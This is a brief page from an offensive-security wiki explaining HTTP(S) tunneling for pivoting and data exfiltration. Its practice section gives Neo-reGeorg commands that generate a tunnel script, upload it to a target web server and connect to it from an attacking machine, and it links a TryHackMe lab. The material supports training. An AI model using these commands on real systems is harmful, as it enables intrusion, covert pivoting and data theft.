# HTTP(S) Tunneling

## Theory
Tunneling over the HTTP protocol technique encapsulates other protocols and sends them back and forth via the HTTP protocol. HTTP tunneling sends and receives many HTTP requests depending on the communication channel. We can pivoting throught this.
{% hint style="danger" %}
We can also use HTTP(S) Tunneling as a good [exfiltration](../exfiltration/README.md) channel.
{% endhint %} 
## Practice

{% tabs %}
{% tab title="Neo-reGeorg" %}
we will be using [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) to achieve tunneling. On our attacking machine we do:
```bash
v4resk@kali$ python3 neoreg.py generate -k 'P@ssw0rd!'
```

then, we have to upload generated files to the target machine and host them on a webserver.
On the attacking machine we can do:
```bash
v4resk@kali$ python3 neoreg.py -k 'P@ssw0rd!' -u http://MACHINE_IP/uploader/files/tunnel.php
```
{% endtab %}
{% endtabs %}


## Resources
{% embed url="https://tryhackme.com/room/dataxexfilt" %}